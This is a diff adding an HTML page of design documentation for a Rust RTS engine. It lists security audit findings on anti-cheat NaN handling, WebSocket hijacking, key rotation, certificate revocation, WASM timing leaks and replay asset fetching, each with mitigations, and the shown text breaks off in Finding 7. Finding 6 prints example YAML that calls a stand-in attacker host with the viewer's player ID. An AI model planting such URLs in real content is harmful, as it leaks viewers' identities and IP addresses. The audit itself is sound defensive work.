@@ -1,0 +1,620 @@
+<!DOCTYPE HTML>
+<html lang="en" class="light sidebar-visible" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>Security Audit Findings - Iron Curtain — Design Documentation</title>
+
+
+        <!-- Custom HTML head -->
+
+        <meta name="description" content="Design docs for a Rust-native Red Alert RTS engine">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="../favicon-de23e50b.svg">
+        <link rel="shortcut icon" href="../favicon-8114d1fc.png">
+        <link rel="stylesheet" href="../css/variables-8adf115d.css">
+        <link rel="stylesheet" href="../css/general-2459343d.css">
+        <link rel="stylesheet" href="../css/chrome-ae938929.css">
+        <link rel="stylesheet" href="../css/print-9e4910d8.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../fonts/fonts-9644e21d.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" id="mdbook-highlight-css" href="../highlight-493f70e1.css">
+        <link rel="stylesheet" id="mdbook-tomorrow-night-css" href="../tomorrow-night-4c0ae647.css">
+        <link rel="stylesheet" id="mdbook-ayu-highlight-css" href="../ayu-highlight-3fdfc3ac.css">
+
+        <!-- Custom theme stylesheets -->
+
+
+        <!-- Provide site root and default themes to javascript -->
+        <script>
+            const path_to_root = "../";
+            const default_light_theme = "light";
+            const default_dark_theme = "navy";
+            window.path_to_searchindex_js = "../searchindex-eb0f51f8.js";
+        </script>
+        <!-- Start loading toc.js asap -->
+        <script src="../toc-2281c970.js"></script>
+    </head>
+    <body>
+    <div id="mdbook-help-container">
+        <div id="mdbook-help-popup">
+            <h2 class="mdbook-help-title">Keyboard shortcuts</h2>
+            <div>
+                <p>Press <kbd>←</kbd> or <kbd>→</kbd> to navigate between chapters</p>
+                <p>Press <kbd>S</kbd> or <kbd>/</kbd> to search in the book</p>
+                <p>Press <kbd>?</kbd> to show this help</p>
+                <p>Press <kbd>Esc</kbd> to hide this help</p>
+            </div>
+        </div>
+    </div>
+    <div id="mdbook-body-container">
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                let theme = localStorage.getItem('mdbook-theme');
+                let sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            const default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? default_dark_theme : default_light_theme;
+            let theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            const html = document.documentElement;
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add("js");
+        </script>
+
+        <input type="checkbox" id="mdbook-sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            let sidebar = null;
+            const sidebar_toggle = document.getElementById("mdbook-sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+                sidebar_toggle.checked = false;
+            }
+            if (sidebar === 'visible') {
+                sidebar_toggle.checked = true;
+            } else {
+                html.classList.remove('sidebar-visible');
+            }
+        </script>
+
+        <nav id="mdbook-sidebar" class="sidebar" aria-label="Table of contents">
+            <!-- populated by js -->
+            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+            <noscript>
+                <iframe class="sidebar-iframe-outer" src="../toc.html"></iframe>
+            </noscript>
+            <div id="mdbook-sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <div id="mdbook-page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="mdbook-menu-bar-hover-placeholder"></div>
+                <div id="mdbook-menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="mdbook-sidebar-toggle" class="icon-button" for="mdbook-sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="mdbook-sidebar">
+                            <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M0 96C0 78.3 14.3 64 32 64H416c17.7 0 32 14.3 32 32s-14.3 32-32 32H32C14.3 128 0 113.7 0 96zM0 256c0-17.7 14.3-32 32-32H416c17.7 0 32 14.3 32 32s-14.3 32-32 32H32c-17.7 0-32-14.3-32-32zM448 416c0 17.7-14.3 32-32 32H32c-17.7 0-32-14.3-32-32s14.3-32 32-32H416c17.7 0 32 14.3 32 32z"/></svg></span>
+                        </label>
+                        <button id="mdbook-theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="mdbook-theme-list">
+                            <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M371.3 367.1c27.3-3.9 51.9-19.4 67.2-42.9L600.2 74.1c12.6-19.5 9.4-45.3-7.6-61.2S549.7-4.4 531.1 9.6L294.4 187.2c-24 18-38.2 46.1-38.4 76.1L371.3 367.1zm-19.6 25.4l-116-104.4C175.9 290.3 128 339.6 128 400c0 3.9 .2 7.8 .6 11.6c1.8 17.5-10.2 36.4-27.8 36.4H96c-17.7 0-32 14.3-32 32s14.3 32 32 32H240c61.9 0 112-50.1 112-112c0-2.5-.1-5-.2-7.5z"/></svg></span>
+                        </button>
+                        <ul id="mdbook-theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-default_theme">Auto</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-ayu">Ayu</button></li>
+                        </ul>
+                        <button id="mdbook-search-toggle" class="icon-button" type="button" title="Search (`/`)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="/ s" aria-controls="mdbook-searchbar">
+                            <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M416 208c0 45.9-14.9 88.3-40 122.7L502.6 457.4c12.5 12.5 12.5 32.8 0 45.3s-32.8 12.5-45.3 0L330.7 376c-34.4 25.2-76.8 40-122.7 40C93.1 416 0 322.9 0 208S93.1 0 208 0S416 93.1 416 208zM208 352c79.5 0 144-64.5 144-144s-64.5-144-144-144S64 128.5 64 208s64.5 144 144 144z"/></svg></span>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">Iron Curtain — Design Documentation</h1>
+
+                    <div class="right-buttons">
+                        <a href="../print.html" title="Print this book" aria-label="Print this book">
+                            <span class=fa-svg id="print-button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M128 0C92.7 0 64 28.7 64 64v96h64V64H354.7L384 93.3V160h64V93.3c0-17-6.7-33.3-18.7-45.3L400 18.7C388 6.7 371.7 0 354.7 0H128zM384 352v32 64H128V384 368 352H384zm64 32h32c17.7 0 32-14.3 32-32V256c0-35.3-28.7-64-64-64H64c-35.3 0-64 28.7-64 64v96c0 17.7 14.3 32 32 32H64v64c0 35.3 28.7 64 64 64H384c35.3 0 64-28.7 64-64V384zm-16-88c-13.3 0-24-10.7-24-24s10.7-24 24-24s24 10.7 24 24s-10.7 24-24 24z"/></svg></span>
+                        </a>
+                        <a href="https://github.com/DK26/iron-curtain-design-docs" title="Git repository" aria-label="Git repository">
+                            <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg></span>
+                        </a>
+                        <a href="https://github.com/DK26/iron-curtain-design-docs/edit/main/src/architecture/security-audit-findings.md" title="Suggest an edit" aria-label="Suggest an edit" rel="edit">
+                            <span class=fa-svg id="git-edit-button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M421.7 220.3l-11.3 11.3-22.6 22.6-205 205c-6.6 6.6-14.8 11.5-23.8 14.1L30.8 511c-8.4 2.5-17.5 .2-23.7-6.1S-1.5 489.7 1 481.2L38.7 353.1c2.6-9 7.5-17.2 14.1-23.8l205-205 22.6-22.6 11.3-11.3 33.9 33.9 62.1 62.1 33.9 33.9zM96 353.9l-9.3 9.3c-.9 .9-1.6 2.1-2 3.4l-25.3 86 86-25.3c1.3-.4 2.5-1.1 3.4-2l9.3-9.3H112c-8.8 0-16-7.2-16-16V353.9zM453.3 19.3l39.4 39.4c25 25 25 65.5 0 90.5l-14.5 14.5-22.6 22.6-11.3 11.3-33.9-33.9-62.1-62.1L314.3 67.7l11.3-11.3 22.6-22.6 14.5-14.5c25-25 65.5-25 90.5 0z"/></svg></span>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="mdbook-search-wrapper" class="hidden">
+                    <form id="mdbook-searchbar-outer" class="searchbar-outer">
+                        <div class="search-wrapper">
+                            <input type="search" id="mdbook-searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="mdbook-searchresults-outer" aria-describedby="searchresults-header">
+                            <div class="spinner-wrapper">
+                                <span class=fa-svg id="fa-spin"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M304 48c0-26.5-21.5-48-48-48s-48 21.5-48 48s21.5 48 48 48s48-21.5 48-48zm0 416c0-26.5-21.5-48-48-48s-48 21.5-48 48s21.5 48 48 48s48-21.5 48-48zM48 304c26.5 0 48-21.5 48-48s-21.5-48-48-48s-48 21.5-48 48s21.5 48 48 48zm464-48c0-26.5-21.5-48-48-48s-48 21.5-48 48s21.5 48 48 48s48-21.5 48-48zM142.9 437c18.7-18.7 18.7-49.1 0-67.9s-49.1-18.7-67.9 0s-18.7 49.1 0 67.9s49.1 18.7 67.9 0zm0-294.2c18.7-18.7 18.7-49.1 0-67.9S93.7 56.2 75 75s-18.7 49.1 0 67.9s49.1 18.7 67.9 0zM369.1 437c18.7 18.7 49.1 18.7 67.9 0s18.7-49.1 0-67.9s-49.1-18.7-67.9 0s-18.7 49.1 0 67.9z"/></svg></span>
+                            </div>
+                        </div>
+                    </form>
+                    <div id="mdbook-searchresults-outer" class="searchresults-outer hidden">
+                        <div id="mdbook-searchresults-header" class="searchresults-header"></div>
+                        <ul id="mdbook-searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('mdbook-sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('mdbook-sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#mdbook-sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="mdbook-content" class="content">
+                    <main>
+                        <h2 id="security-audit-findings"><a class="header" href="#security-audit-findings">Security Audit Findings</a></h2>
+<p>Comprehensive verification of anti-cheat logic and security across the Iron Curtain design documentation. This audit cross-references <code>06-SECURITY.md</code> (56 vulnerabilities), <code>architecture/api-misuse-defense.md</code> (88 misuse vectors), <code>tracking/testing-strategy.md</code>, <code>03-NETCODE.md</code>, <code>04-MODDING.md</code>, <code>07-CROSS-ENGINE.md</code>, <code>architecture/type-safety.md</code>, <code>decisions/09b/D052-community-servers.md</code>, <code>decisions/09f/D071-external-tool-api.md</code>, and <code>decisions/09g/D058-command-console.md</code> / <code>D059-communication.md</code>.</p>
+<p><strong>Audit date:</strong> 2025-06<br><strong>Scope:</strong> Design-phase verification — no implementation code exists. Findings target design gaps, inconsistencies, missing threat coverage, and specification ambiguities.</p>
+<p><strong>Resolution status:</strong> All 18 findings <strong>CLOSED</strong> in design docs (2025-06). See cross-references below.</p>
+<hr>
+<h3 id="resolution-summary"><a class="header" href="#resolution-summary">Resolution Summary</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Finding</th><th>Severity</th><th>Resolution</th><th>Cross-Reference</th></tr>
+</thead>
+<tbody>
+<tr><td>F1</td><td>HIGH</td><td>CLOSED — Pipeline-wide NaN guards with fail-closed semantics</td><td>V34 amended, proptest added</td></tr>
+<tr><td>F2</td><td>HIGH</td><td>CLOSED — New vulnerability entry with origin validation + challenge secret</td><td>V57 added</td></tr>
+<tr><td>F3</td><td>HIGH</td><td>CLOSED — Monotonic sequence number + cooldown + conflict resolution</td><td>V47 amended</td></tr>
+<tr><td>F4</td><td>HIGH</td><td>CLOSED — Tiered hard-fail/grace/soft-fail CRL policy</td><td>V48 amended</td></tr>
+<tr><td>F5</td><td>MEDIUM</td><td>CLOSED — Pre-filter by fog + constant-time padding</td><td>V5 amended, proptest added</td></tr>
+<tr><td>F6</td><td>MEDIUM</td><td>CLOSED — External URL blocking during replay playback</td><td>V41 amended, proptest added</td></tr>
+<tr><td>F7</td><td>MEDIUM</td><td>CLOSED — 120-second minimum observer delay floor for ranked</td><td>V59 added</td></tr>
+<tr><td>F8</td><td>MEDIUM</td><td>CLOSED — <code>.iccmd</code> added to Workshop supply chain scope</td><td>V18 amended</td></tr>
+<tr><td>F9</td><td>MEDIUM</td><td>CLOSED — Separate <code>order_stream_hash</code> from <code>replay_hash</code></td><td>V13 amended</td></tr>
+<tr><td>F10</td><td>MEDIUM</td><td>CLOSED — Explicit WASI networking denial</td><td>V5 amended</td></tr>
+<tr><td>F11</td><td>MEDIUM</td><td>CLOSED — Concrete weighting algorithm with factor normalization</td><td>V12 amended</td></tr>
+<tr><td>F12</td><td>MEDIUM</td><td>CLOSED — New vulnerability entry: settings notification + ranked whitelist</td><td>V58 added</td></tr>
+<tr><td>F13</td><td>LOW</td><td>CLOSED — Canonical cross-reference table D059 ↔ ProtocolLimits</td><td>V15 amended</td></tr>
+<tr><td>F14</td><td>LOW</td><td>CLOSED — <code>todo!()</code> implementation guard + CI test</td><td>V35 amended</td></tr>
+<tr><td>F15</td><td>LOW</td><td>CLOSED — <code>_private: ()</code> validated construction for alpha</td><td>V34 amended</td></tr>
+<tr><td>F16</td><td>LOW</td><td>CLOSED — Documented as known lockstep limitation + layered mitigations</td><td>V60 added</td></tr>
+<tr><td>F17</td><td>LOW</td><td>CLOSED — Sparse storage spec with pruning + estimates</td><td>V26 amended</td></tr>
+<tr><td>F18</td><td>LOW</td><td>CLOSED — Dev mode toggle as PlayerOrder in order stream</td><td>V44 amended</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h3 id="summary"><a class="header" href="#summary">Summary</a></h3>
+<p>The security architecture is <strong>comprehensive and well-structured</strong> for a design-phase project. The 56 documented vulnerabilities in <code>06-SECURITY.md</code> cover the major attack surfaces of a competitive multiplayer RTS with community modding. The layered defense philosophy (prevention → detection → deterrence), population-baseline anti-cheat adaptation, and type-system defenses (27 compile-time blocks across 88 API misuse vectors) demonstrate serious security engineering.</p>
+<p><strong>Strengths:</strong></p>
+<ul>
+<li>Threat matrix covers 56 distinct vulnerabilities across all subsystems</li>
+<li>Relay-as-trust-anchor provides a strong security foundation</li>
+<li>Workshop supply chain defense has 5 independent layers (V18)</li>
+<li>Anti-cheat dual-model detection draws from successful open-source precedents (Lichess, FairFight, DDNet)</li>
+<li>Path security via <code>strict-path</code> is consistent across all file-handling surfaces</li>
+<li>Cross-engine trust tiers (V36 / 07-CROSS-ENGINE.md) explicitly classify and communicate security posture</li>
+<li>Type-safety document enforces 13 distinct compile-time defense patterns</li>
+<li>Wave ban strategy and continuous calibration loop address detection evasion</li>
+<li>Testing strategy includes 18 fuzz targets, 17 proptest properties, and labeled replay corpus</li>
+</ul>
+<p><strong>This audit found 18 findings</strong>: 4 high-severity, 8 medium-severity, 6 low-severity.</p>
+<hr>
+<h3 id="finding-1-nan-propagation-chain-in-anti-cheat-scoring-pipeline"><a class="header" href="#finding-1-nan-propagation-chain-in-anti-cheat-scoring-pipeline">Finding 1: NaN Propagation Chain in Anti-Cheat Scoring Pipeline</a></h3>
+<p><strong>Severity: HIGH</strong><br><strong>Affected:</strong> V12, V34, V36 (06-SECURITY.md)</p>
+<p>V34 adds NaN guards to <code>EwmaTrafficMonitor</code>, but the broader anti-cheat scoring pipeline has multiple <code>f64</code> stages without documented NaN guards:</p>
+<pre><code>PlayerBehaviorProfile (f64 fields)
+  → behavioral_score (f64, 0.0–1.0)
+    → DualModelAssessment.combined (f64)
+      → AntiCheatAction threshold comparisons
+</code></pre>
+<p>Also affected:</p>
+<ul>
+<li><code>TrustFactors.report_rate</code>, <code>commend_rate</code>, <code>abandon_rate</code> (all <code>f64</code>)</li>
+<li><code>PopulationBaseline.apm_p99</code>, <code>entropy_p5</code> (both <code>f64</code>)</li>
+</ul>
+<p>A NaN at any stage propagates to all downstream threshold comparisons. Since <code>NaN &gt; 0.75</code> is <code>false</code> and <code>NaN &lt; 0.5</code> is also <code>false</code>, a NaN in <code>combined</code> would cause the anti-cheat action logic to return <code>Clear</code> — giving a cheater immunity.</p>
+<p><strong>Recommendation:</strong> Apply V34’s NaN guard pattern to <strong>every</strong> <code>f64</code> field in the anti-cheat pipeline: after every computation of <code>behavioral_score</code>, <code>statistical_score</code>, <code>combined</code>, and all <code>TrustFactors</code> fields. Add a proptest property: “No sequence of inputs produces NaN in any anti-cheat scoring field.” Add to testing-strategy.md’s proptest section.</p>
+<p><strong>Milestone:</strong> M4 (anti-cheat infrastructure)</p>
+<hr>
+<h3 id="finding-2-icrp-local-websocket--cross-site-websocket-hijacking-cswsh"><a class="header" href="#finding-2-icrp-local-websocket--cross-site-websocket-hijacking-cswsh">Finding 2: ICRP Local WebSocket — Cross-Site WebSocket Hijacking (CSWSH)</a></h3>
+<p><strong>Severity: HIGH</strong><br><strong>Affected:</strong> D071 (09f/D071-external-tool-api.md)</p>
+<p>ICRP exposes a local JSON-RPC 2.0 WebSocket server. This opens a Cross-Site WebSocket Hijacking attack: a malicious webpage loaded in any browser can connect to <code>ws://localhost:PORT</code> and issue ICRP commands. The SHA-256 challenge auth partially mitigates this, but:</p>
+<ol>
+<li>The challenge secret must be stored locally (file or environment variable). Any local process or browser extension with filesystem read access can obtain it.</li>
+<li>The doc does not specify <strong>Origin header validation</strong> — the WebSocket server should reject connections from non-<code>localhost</code> origins.</li>
+<li>No CORS restrictions are documented for the HTTP fallback endpoint.</li>
+<li>Browser-based attacks from <code>http://evil.com</code> could connect if no Origin check exists.</li>
+</ol>
+<p><strong>Recommendation:</strong></p>
+<ul>
+<li>Mandate <code>Origin</code> header validation: accept only <code>null</code> (local file) and <code>http://localhost:*</code> / <code>http://127.0.0.1:*</code></li>
+<li>Require CORS whitelist for HTTP fallback endpoint (no <code>Access-Control-Allow-Origin: *</code>)</li>
+<li>Document the challenge secret storage location and file permissions (e.g., <code>0600</code> / user-only read)</li>
+<li>Add CSWSH to the threat model in <code>06-SECURITY.md</code></li>
+</ul>
+<p><strong>Milestone:</strong> M3 (ICRP ships Phase 2–3)</p>
+<hr>
+<h3 id="finding-3-v47-key-rotation--dual-signature-race-condition"><a class="header" href="#finding-3-v47-key-rotation--dual-signature-race-condition">Finding 3: V47 Key Rotation — Dual-Signature Race Condition</a></h3>
+<p><strong>Severity: HIGH</strong><br><strong>Affected:</strong> V47 (06-SECURITY.md), D052 (09b/D052-community-servers.md)</p>
+<p>The <code>KeyRotation</code> struct requires signatures from both old and new keys. If the old key is compromised, the attacker possesses it. Both the legitimate user and attacker can simultaneously issue valid <code>KeyRotation</code> messages:</p>
+<ul>
+<li>Attacker: rotates old → attacker’s new key (signed by old + attacker’s new)</li>
+<li>Legitimate user: rotates old → user’s recovery key (signed by old + user’s new)</li>
+</ul>
+<p>Both are structurally valid. The protocol doesn’t specify:</p>
+<ul>
+<li>Tiebreaker when two conflicting rotations arrive at the same relay</li>
+<li>Monotonic sequence number requirement for rotation messages</li>
+<li>A cooldown between rotation operations</li>
+</ul>
+<p>The BIP-39 emergency rotation (immediate, bypass old key) is the correct recovery path, but the standard rotation path has a TOCTOU window.</p>
+<p><strong>Recommendation:</strong></p>
+<ul>
+<li>Require monotonic <code>rotation_sequence_number</code> in <code>KeyRotation</code> — community server accepts only the first valid rotation for a given old key</li>
+<li>Add a 24-hour cooldown between non-emergency rotations for the same key</li>
+<li>Specify that emergency rotation (via BIP-39 mnemonic) always takes priority over standard rotation</li>
+<li>Document the conflict resolution rule: “first valid rotation seen by the community authority wins; subsequent conflicting rotations are rejected”</li>
+</ul>
+<p><strong>Milestone:</strong> M8 (identity key management ships Phase 5)</p>
+<hr>
+<h3 id="finding-4-v48-crl-revocation--unknown-status-behavior-unspecified"><a class="header" href="#finding-4-v48-crl-revocation--unknown-status-behavior-unspecified">Finding 4: V48 CRL Revocation — Unknown-Status Behavior Unspecified</a></h3>
+<p><strong>Severity: HIGH</strong><br><strong>Affected:</strong> V48 (06-SECURITY.md)</p>
+<p>CRL cache TTL is 1 hour. OCSP fast-check has a 50ms timeout. The doc doesn’t specify behavior when <strong>both</strong> fail (cache expired AND OCSP unreachable):</p>
+<ul>
+<li>If the client proceeds anyway (soft-fail), a revoked server operates indefinitely when the CRL distribution point is down</li>
+<li>If the client blocks (hard-fail), network issues at the CRL endpoint prevent all community server connections — a denial-of-service via CRL infrastructure</li>
+</ul>
+<p>This is the same “soft-fail vs hard-fail” debate from the TLS certificate revocation world. Neither extreme is acceptable.</p>
+<p><strong>Recommendation:</strong></p>
+<ul>
+<li>Specify a <strong>hard-fail with grace period</strong>: if CRL is expired AND OCSP fails, accept the cached CRL for an additional 24 hours, then hard-fail. This gives operators time to fix CRL distribution while bounding the vulnerability window.</li>
+<li>For ranked matches specifically: hard-fail immediately when revocation status is unknown (competitive integrity &gt; availability)</li>
+<li>For unranked: soft-fail with a visible warning (“Server certificate status could not be verified”)</li>
+<li>Add this decision to the Competitive Integrity Summary table</li>
+</ul>
+<p><strong>Milestone:</strong> M9+ (community server auth ships Phase 7)</p>
+<hr>
+<h3 id="finding-5-wasm-timing-side-channel-maphack"><a class="header" href="#finding-5-wasm-timing-side-channel-maphack">Finding 5: WASM Timing Side-Channel Maphack</a></h3>
+<p><strong>Severity: MEDIUM</strong><br><strong>Affected:</strong> V5 (06-SECURITY.md), 04-MODDING.md WASM Sandbox</p>
+<p>The WASM capability model prevents direct access to fogged state (<code>no get_all_units()</code>). However, a malicious WASM mod could infer fogged information via timing side channels:</p>
+<ul>
+<li><code>ic_query_units_in_range()</code> execution time correlates with the number of units in the spatial index, including fogged units (the spatial index operates on world state, not per-player visibility)</li>
+<li>A mod measuring host call duration across successive ticks can detect unit movement in fogged regions</li>
+<li>This is a maphack variant that bypasses the capability model entirely</li>
+</ul>
+<p><strong>Recommendation:</strong></p>
+<ul>
+<li>Host API functions that query spatial data must first filter by the calling player’s fog-of-war before performing the query — NOT filter the results after the query</li>
+<li>Alternatively, pad all spatial query host calls to a constant execution time (ceiling of worst-case for the map size)</li>
+<li>Add “timing oracle resistance” as a WASM host API design principle in <code>04-MODDING.md</code></li>
+<li>In fog-authoritative mode, this is not exploitable (fogged entities don’t exist on the client). Document this as an additional argument for fog-authoritative for competitive play.</li>
+</ul>
+<p><strong>Milestone:</strong> M7 (WASM modding ships Phase 4–6)</p>
+<hr>
+<h3 id="finding-6-replay-viewer-external-asset-fetch-via-embedded-yaml"><a class="header" href="#finding-6-replay-viewer-external-asset-fetch-via-embedded-yaml">Finding 6: Replay Viewer External Asset Fetch via Embedded YAML</a></h3>
+<p><strong>Severity: MEDIUM</strong><br><strong>Affected:</strong> V41 (06-SECURITY.md)</p>
+<p>V41 restricts <code>SelfContained</code> replays to map data and rule YAML only (no Lua/WASM). However, embedded YAML rules could contain external asset references:</p>
+<pre><code class="language-yaml"># Embedded in a SelfContained replay's rules
+faction_icon: "https://evil.com/track.png?viewer={player_id}"
+custom_sprite: "https://evil.com/exploit.shp"
+</code></pre>
+<p>If the replay viewer loads these YAML rules and the asset loader follows external URLs, the viewer’s IP and potentially identity are leaked to the attacker’s server. This enables:</p>
+<ul>
+<li>Viewer tracking (who watched the replay and when)</li>
+<li>De-anonymization (IP to profile correlation)</li>
+<li>Potential asset parser exploitation (V38) via crafted remote assets</li>
+</ul>
+<p><strong>Recommendation:</strong></p>
+<ul>
+<li>During replay playback of <code>SelfContained</code> replays, <strong>disable all external asset resolution</strong>. Asset references must resolve to locally cached content or fail silently with a placeholder.</li>
+<li>Add to V41’s “Content-type restriction”: “Embedded YAML asset references are resolved only against locally installed content. Remote URLs in embedded rules are ignored.”</li>
+<li>Add network isolation for replay playback to the testing strategy</li>
+</ul>
+<p><strong>Milestone:</strong> M4 (replay system ships Phase 2, SelfContained ships Phase 5)</p>
+<hr>
+<h3 id="finding-7-missing-spectator-delay-in-ranked-security-policy"><a class="header" href="#finding-7-missing-spectator-delay-in-ranked-security-policy">Finding 7: Missing Spectator Delay in Ranked Security Policy</a></h3>
+<p><strong>Severity: MEDIUM</strong><br><strong>Affected:</strong> D071, 06-SECURITY.md Competitive Integrity Summary</p>
+<p>D071 mentions “ranked mode restricts to observer-with-delay” but neither <code>06-SECURITY.md</code> nor D071 specifies:</p>
+<ul>
+<li>The minimum delay value for ranked match observation</li>
+<li>Whether the delay is configurable per community server (could be set to 0, defeating the purpose)</li>
+<li>Whether live coaching (spectator communicating with a player) is detectable</li>
